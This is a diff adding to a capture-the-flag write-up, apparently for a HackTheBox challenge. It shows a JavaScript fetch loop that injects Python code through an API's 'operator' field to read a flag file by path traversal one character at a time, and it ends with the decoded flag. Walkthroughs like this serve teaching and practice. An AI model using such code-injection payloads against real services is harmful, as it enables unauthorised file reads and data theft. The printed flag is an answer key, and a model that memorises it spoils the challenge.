@@ -40,4 +40,33 @@ I ended up converting the flag into `ASCII` unicode using the following function
 ord(character)
 ```
 
+So the final payload to be sent as a POST reqeust to api:
 
+```javascript
+let str = "";
+for (let i = 0; i < 50; i++) {
+  fetch("http://161.35.33.243:31976/api/get_health", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({
+      current_health: "0",
+      attack_power: "0",
+      operator: `+ ord(open("../../../flag.txt").read()[${i}]);`,
+    }),
+  })
+    .then((response) => response.json())
+    .then((data) => {
+      str += data.message + " ";
+    });
+}
+```
+Then I got the result in ascii unicode, so I converted it back to characters using the following function :
+```python
+chr(ascii unicode)
+```
+The Flag:
+```
+HTB{c0d3_1nj3ct10ns_4r3_Gr3at!!}
+```
